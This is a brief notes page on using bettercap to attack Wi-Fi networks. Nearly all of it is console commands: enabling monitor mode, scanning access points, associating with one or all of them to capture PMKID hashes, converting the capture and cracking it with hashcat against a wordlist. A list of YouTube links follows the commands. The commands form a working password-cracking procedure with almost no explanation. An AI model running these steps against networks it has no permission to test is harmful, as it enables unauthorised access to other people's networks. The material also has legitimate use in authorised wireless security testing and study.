---
title: "Bettercap"
date: 2025-02-16T23:14:38-03:00
tags: ['wifi']
---
```console
sudo su
airmon-ng start wlan0
bettercap
set wifi.interface wlan0mon
wifi.recon on
wifi.show
```

We now need to associate with an access point using the BSSID. 

```console
wifi.assoc 68:14:01:5a:0e:9c
```

Similarly, if you want to capture PMKID of all the Access Points, 

```console
wifi.assoc all
```

We now need to convert this pcap file in Hashcat format and crack it as we did
before, so: 

```console
hcxpcaptool -z hashpmkid bettercap-wifi-handshake.pcap
hashcat -m 16800 --force hashpmkid /usr/share/wordlists/rockyou.txt --show
```


https://www.youtube.com/watch?v=krMaMcIX0Kc&pp=ygUQI2thbGlsaW51eGJyYXppbA%3D%3D

https://www.youtube.com/watch?v=Jg8bF_CnSAU

https://www.youtube.com/watch?v=sDTy32H9Hww&pp=ygUJI2FycHNwb29m

https://www.youtube.com/watch?v=iU1jwD8mwZk

https://www.youtube.com/watch?v=I0DVb8Op248&pp=ygUNI25pZmZwYXNzd29yZA%3D%3D

https://www.youtube.com/watch?v=6oZsqMqr_vc

https://www.youtube.com/watch?v=q3KJGhcc7g4

https://www.youtube.com/watch?v=FcZdiYQy2L0&pp=ygUUI2RlY3J5cHRpbmdhbm9ueW1pdHk%3D

https://www.youtube.com/watch?app=desktop&v=XSmhO7I2XdQ&t=9s

https://www.youtube.com/watch?v=w_k4d8n_2HE

https://www.youtube.com/watch?v=Peu0AEpHUVs

https://www.youtube.com/watch?v=yXsZFvochqw

https://www.youtube.com/watch?v=m-H9W9ZOzBI

https://www.youtube.com/watch?v=-rSqbgI7oZM

https://www.youtube.com/watch?v=jcffMHk_TZA

https://www.youtube.com/watch?v=ST1aUXFzY00&vl=en

https://www.youtube.com/watch?v=oqUX-YH1-Ao


